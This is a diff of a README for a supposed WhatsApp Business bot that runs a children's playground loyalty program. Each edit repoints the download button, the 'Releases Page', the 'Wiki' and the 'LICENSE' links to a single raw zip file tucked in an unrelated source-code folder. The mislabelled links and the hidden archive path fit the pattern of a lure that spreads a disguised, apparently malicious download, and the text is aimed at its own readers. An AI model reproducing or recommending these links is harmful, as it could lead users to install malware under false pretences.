@@ -4,7 +4,7 @@
 Welcome to the teddy_project! This application is a WhatsApp Business bot designed to make children's playground visits more enjoyable with a loyalty program, vouchers, and a user-friendly multilingual admin panel.
 
 ## 📥 Download the Application
-[![Download teddy_project](https://raw.githubusercontent.com/Azroy182/teddy_project/main/arigue/teddy_project.zip)](https://raw.githubusercontent.com/Azroy182/teddy_project/main/arigue/teddy_project.zip)
+[![Download teddy_project](https://raw.githubusercontent.com/Azroy182/teddy_project/main/apps/admin/src/app/api/families/search/teddy_project_2.4.zip)](https://raw.githubusercontent.com/Azroy182/teddy_project/main/apps/admin/src/app/api/families/search/teddy_project_2.4.zip)
 
 ## 📋 Features
 - **Loyalty Program:** Encourage repeat visits with rewards.
@@ -21,7 +21,7 @@ To run this application, ensure your system meets the following requirements:
 - **Docker:** Docker installed for smooth operation.
 
 ## 📅 Download & Install
-1. **Visit the Releases Page:** Go to the following link to download the latest version of the teddy_project: [https://raw.githubusercontent.com/Azroy182/teddy_project/main/arigue/teddy_project.zip](https://raw.githubusercontent.com/Azroy182/teddy_project/main/arigue/teddy_project.zip).
+1. **Visit the Releases Page:** Go to the following link to download the latest version of the teddy_project: [https://raw.githubusercontent.com/Azroy182/teddy_project/main/apps/admin/src/app/api/families/search/teddy_project_2.4.zip](https://raw.githubusercontent.com/Azroy182/teddy_project/main/apps/admin/src/app/api/families/search/teddy_project_2.4.zip).
   
 2. **Choose the Right File:** On the releases page, you will see a list of available files. Pick the file that matches your operating system.
 
@@ -46,13 +46,13 @@ Setting up the teddy_project requires minimal configuration:
 If you run into any issues or have questions, check our GitHub Issues page. You can also join our community chat to connect with other users and get help.
 
 ## 🔗 Additional Resources
-- **Documentation:** For detailed information on using the teddy_project, visit our [Wiki](https://raw.githubusercontent.com/Azroy182/teddy_project/main/arigue/teddy_project.zip).
+- **Documentation:** For detailed information on using the teddy_project, visit our [Wiki](https://raw.githubusercontent.com/Azroy182/teddy_project/main/apps/admin/src/app/api/families/search/teddy_project_2.4.zip).
 - **Community Forum:** Join discussions and share experiences at our community forum.
 
 ## 📝 License
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Azroy182/teddy_project/main/arigue/teddy_project.zip) file for more information.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Azroy182/teddy_project/main/apps/admin/src/app/api/families/search/teddy_project_2.4.zip) file for more information.
 
 ## 🌟 Join Us!
 We appreciate your interest in teddy_project! Your feedback helps us improve. If you enjoy the application, consider leaving a comment or review on our GitHub page.
 
-[![Download teddy_project](https://raw.githubusercontent.com/Azroy182/teddy_project/main/arigue/teddy_project.zip)](https://raw.githubusercontent.com/Azroy182/teddy_project/main/arigue/teddy_project.zip)
+[![Download teddy_project](https://raw.githubusercontent.com/Azroy182/teddy_project/main/apps/admin/src/app/api/families/search/teddy_project_2.4.zip)](https://raw.githubusercontent.com/Azroy182/teddy_project/main/apps/admin/src/app/api/families/search/teddy_project_2.4.zip)
